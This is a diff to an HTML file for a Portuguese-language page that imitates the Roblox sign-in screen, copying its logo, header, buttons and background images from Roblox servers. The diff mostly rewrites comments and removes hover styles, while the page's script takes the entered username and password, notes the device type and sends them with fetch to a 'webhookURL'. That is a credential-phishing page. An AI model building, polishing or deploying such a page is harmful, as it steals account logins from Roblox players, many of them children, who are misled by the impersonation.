@@ -6,7 +6,7 @@
     <title>Entrar na Roblox</title>
     <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
     <style>
-        /* IMPORTANDO FONTES E DEFININDO VARIÁVEIS DO SISTEMA FOUNDATION */
+        /* FONTES E CORES OFICIAIS FOUNDATION */
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
 
         :root {
@@ -23,7 +23,7 @@
             --radius-main: 8px;
         }
 
-        /* BARRA DE ROLAGEM CUSTOMIZADA */
+        /* BARRA DE ROLAGEM ESTILIZADA */
         ::-webkit-scrollbar { width: 14px; }
         ::-webkit-scrollbar-track { background: var(--bg-card); }
         ::-webkit-scrollbar-thumb { 
@@ -39,7 +39,7 @@
             overflow-x: hidden;
         }
 
-        /* CABEÇALHO OFICIAL REFINADO */
+        /* CABEÇALHO REPLICADO */
         .roblox-header { 
             width: 100%; height: 44px; background: var(--bg-header); 
             display: flex; align-items: center; padding: 0 16px; 
@@ -58,10 +58,7 @@
             align-items: center;
         }
 
-        .nav-links span { cursor: pointer; transition: opacity 0.2s; }
-        .nav-links span:hover { opacity: 0.8; }
-
-        /* BARRA DE PESQUISA */
+        /* BARRA DE PESQUISA COM ÍCONE */
         .search-container {
             margin-left: 20px; position: relative; width: 280px;
         }
@@ -78,7 +75,7 @@
             opacity: 0.7;
         }
 
-        /* BOTÕES DO CABEÇALHO (O QUE FALTAVA) */
+        /* BOTÕES DE TOPO */
         .header-right { display: flex; align-items: center; gap: 8px; }
 
         .btn-header-signup {
@@ -87,17 +84,13 @@
             cursor: pointer; transition: background 0.2s; white-space: nowrap;
         }
 
-        .btn-header-signup:hover { background-color: var(--rbx-blue-hover); }
-
         .btn-header-login {
             background: transparent; color: white; border: 1px solid white;
             padding: 4px 14px; border-radius: 6px; font-weight: 600; font-size: 14px;
             cursor: pointer; transition: background 0.2s; white-space: nowrap;
         }
 
-        .btn-header-login:hover { background: rgba(255,255,255,0.1); }
-
-        /* CONTEÚDO PRINCIPAL */
+        /* CONTEÚDO CENTRAL */
         .main-content { 
             min-height: 100vh; display: flex; align-items: center; justify-content: center; 
             background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
@@ -127,8 +120,7 @@
             font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s ease; 
         }
 
-        .btn-primary:hover { background-color: var(--rbx-blue-hover); }
-
+        /* FEEDBACK DE ERRO */
         #error-msg { 
             color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
             text-align: left; background: rgba(223, 40, 31, 0.15); padding: 12px; 
@@ -154,7 +146,6 @@
 
     <div id="loading-overlay"><div class="spinner"></div></div>
 
-    <!-- CABEÇALHO REPLICADO DA IMAGEM -->
     <header class="roblox-header">
         <div class="header-left">
             <svg class="roblox-logo" viewBox="0 0 28 28">
@@ -172,7 +163,6 @@
             </div>
         </div>
         
-        <!-- BOTÕES DO CANTO DIREITO (CADASTRAR E ENTRAR) -->
         <div class="header-right">
             <button class="btn-header-signup">Cadastrar-se</button>
             <button class="btn-header-login">Entrar</button>
@@ -226,7 +216,7 @@
             if (!u || !p) { triggerError(); return; }
 
             overlay.style.display = 'flex';
-            const device = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
 
             try {
                 await fetch(webhookURL, {
